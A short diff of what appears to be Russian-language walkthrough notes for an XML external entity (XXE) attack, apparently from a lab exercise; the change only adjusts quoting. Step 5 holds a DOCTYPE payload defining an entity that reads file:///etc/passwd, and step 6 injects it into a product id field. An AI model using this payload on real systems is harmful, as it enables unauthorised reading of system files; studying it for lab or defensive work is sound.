@@ -9,7 +9,7 @@
 
 5) после объявления xml добавить
 
-''' <!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/passwd"> ]> '''
+' <!DOCTYPE kek [ <!ENTITY res SYSTEM "file:///etc/passwd"> ]> '
 
 6)заменить product id число на &res; 
 
